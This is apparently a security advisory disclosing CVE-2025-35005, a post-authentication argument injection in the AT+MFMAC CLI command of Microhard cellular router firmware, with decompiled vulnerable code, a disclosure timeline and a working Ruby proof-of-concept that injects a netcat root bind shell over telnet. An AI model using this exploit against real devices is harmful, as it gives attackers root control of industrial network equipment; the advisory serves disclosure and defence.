---
title: CVE-2025-35005
aliases:
  - /cves/CVE-2025-35005.html
---

# CVE-2025-35005: Microhard Bullet-LTE and IPn4Gii AT+MFMAC Argument Injection

[AHA!] has discovered an issue with multiple Microhard products, and is issuing this disclosure in accordance with AHA!'s standard [disclosure policy] on June 8, 2025. [CVE-2025-35005] has been assigned to this issue.

Any questions about this disclosure should be directed to cve@takeonme.org.

# Executive Summary

Products that incorporate the Microhard [BulletLTE-NA2] and [IPn4Gii-NA2] are vulnerable to a post-authentication command injection issue that can lead to privilege escalation. This is an instance of [CWE-88](https://cwe.mitre.org/data/definitions/88.html), "Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')," and is estimated as a CVSS [7.1](https://www.first.org/cvss/calculator/3-1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N).

# Technical Details

A command injection vulnerability exists within the AT+MFMAC command in the restricted CLI interface of multiple Microhard products. Authentication is required to exploit this vulnerability in that you must have a user account to access the CLI via telnet. However, the service is running as root, so injecting commands allows an attacker to escape the restricted shell and elevate privileges for full access.

The [firmware] for affected devices contains the binary `/bin/clitest`, which handles the restricted CLI interface. It is reachable via telnet or ssh connection. It allows the user to run certain config commands as well as AT+ commands to interact with the Quectel modem. One of these AT+ commands is AT+MFMAC which is used for querying/configuring the MAC firewall. User input supplied to the cmd_firewall_mac() function in param_3 and is used as an argument for the /etc/m_cli/atcmd_sh_firewall.sh script which is called via popen():

```
undefined4 cmd_firewall_mac(undefined4 param_1,undefined4 param_2,char **param_3,int param_4)
{
	...
        if (((int)uVar5 != 0) &&
           (iVar2 = FUN_00021524(param_3[4],(int)((ulonglong)uVar5 >> 0x20)), iVar2 != 0)) {
          iVar2 = atoi(param_3[3]);
          sprintf(acStack_374,"sh /etc/m_cli/atcmd_sh_firewall.sh %s %s %s %s","mac_set_one",
                  acStack_334,auStack_1b0 + iVar2 * 0x84,param_3[4]);
          memset(local_2b4,0,0x100);
          iVar2 = FUN_0000e9a0(param_1,acStack_374,local_2b4,0x100);
          if (iVar2 == 0) {
            pcVar4 = "ERROR";
            goto LAB_00028cf8;
          }
        }
	...
}

size_t FUN_0000e9a0(undefined4 param_1,char *param_2,void *param_3,size_t param_4)
{
  FILE *__stream;
  char *__s;
  size_t sVar1;
  
  __stream = popen(param_2,"r");
  if (__stream != (FILE *)0x0) {
    memset(param_3,0,param_4);
    fread(param_3,1,param_4,__stream);
    pclose(__stream);
    __s = (char *)trimwhitespace(param_3);
    sVar1 = strlen(__s);
    return sVar1;
  }
  cli_print(param_1,"ERROR: Failed to run script");
  return 0;
}
```

If an attacker wraps input to the AT+MFMAC command in `$()` (dollar-parentheses) or backticks (which are tricky to render in Markdown!) they can put whatever command they want and it will be run as the root user. Note that spaces are not allowed, so $IFS must be used instead for space-delimited arguments for the command payload.

The Ruby script below effectively demonstrates an attack using [CVE-2025-35005] as a proof-of-concept:

```ruby
#!/usr/bin/env ruby
require 'net/telnet'
require 'io/console'

if !ARGV[0]
  puts "usage: #{$0} <ip> [<username> <password>]"
  exit(1)
end

target = ARGV[0]
if ARGV[1] && ARGV[2]
  user = ARGV[1]
  pass = ARGV[2]
else
  printf("user: ")
  user = STDIN.gets.chomp
  printf("pass: ")
  pass = STDIN.noecho(&:gets).chomp
  puts ""
end

telnet = Net::Telnet::new("Host" => target, "Timeout" => 2, "Prompt" => /^\w+>/)
telnet.login(user,pass) {|c| print c}
begin
  telnet.cmd("at+mfmac=`nc$IFS-lvp$IFS\\4444$IFS-e$IFS/bin/sh$IFS-i`") {|c| print c}
rescue
  puts "shell spawned on #{ARGV[0]}:4444"
  pid = spawn("nc -v #{ARGV[0]} 4444")
  Process.wait pid
end

telnet.close
```

# Attacker Value

If an attacker has a valid credential to the affected Microhard device, and the means to login (for example, over telnet), that attacker can leverage this vulnerability to escape the restricted shell and elevate privileges to root. Industrial control systems (ICS) are often deployed with easy to guess or default credentials, which could be used in conjunction with [CVE-2025-35005] to achieve complete, root-level remote control over affected devices.

# Credit

This vulnerability was discovered and documented by Ricky "HeadlessZeke" Lawshae of Keysight.

# Timeline

* 2025-03-27 (Thu): Presented at regularly scheduled AHA! meeting 0x00df
* 2025-04-02 (Wed): Contact initiated to several guessed email aliases, such as info@microhardcorp.com,  support@microhardcorp.com, etc.
* 2025-04-02 (Wed): Bounces collected from media@, press@, security@, and secure@. No bounce notification was generated from info@ and support@, though a customer account was required to further communicate with support@, which [AHA!] does not have.
* 2025 (April and May): No further communication from the vendor was received.
* 2025-06-08 (Sun): Verified current IPn4Gii/BulletLTE [firmware] remains at v1.2.0-r1132 
* 2025-06-08 (Sun): Public disclosure of [CVE-2025-35005]

----

[AHA!]: https://takeonme.org
[disclosure policy]: https://takeonme.org/cve.html
[CVE-2025-35005]: https://www.cve.org/CVERecord?id=CVE-2025-35005
[BulletLTE-NA2]: https://www.microhardcorp.com/BulletLTE-NA2.php
[IPn4Gii-NA2]: https://www.microhardcorp.com/IPn4Gii-NA2.php
[firmware]: https://support.microhardcorp.com/portal/en/kb/articles/ipn4gii-bullet-lte-firmware
